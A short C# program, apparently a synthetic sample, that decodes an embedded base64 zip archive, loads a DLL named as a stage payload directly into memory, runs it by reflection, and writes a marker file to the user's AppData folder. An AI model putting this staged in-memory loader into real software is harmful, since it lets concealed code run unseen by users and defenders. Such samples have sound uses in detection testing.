using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;

byte[] archiveBytes = Convert.FromBase64String(EmbeddedArchive.Base64);
using var source = new MemoryStream(archiveBytes);
using var archive = new ZipArchive(source, ZipArchiveMode.Read, true);
ZipArchiveEntry? selected = null;
foreach (ZipArchiveEntry entry in archive.Entries)
{
    if (entry.FullName == "stage/ManagedZipStagePayload.dll")
        selected = entry;
}
using var member = selected!.Open();
using var buffer = new MemoryStream();
member.CopyTo(buffer);
byte[] stageBytes = buffer.ToArray();
Assembly loaded = Assembly.Load(stageBytes);
Type stageType = loaded.GetType("Stage.Payload")!;
stageType.GetMethod("Run")!.Invoke(null, null);
string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
string stateName = "zip-stage-state-" + Environment.GetEnvironmentVariable("COMPUTERNAME") + ".txt";
File.WriteAllText(Path.Combine(roaming, stateName), "zip-stage-ok");
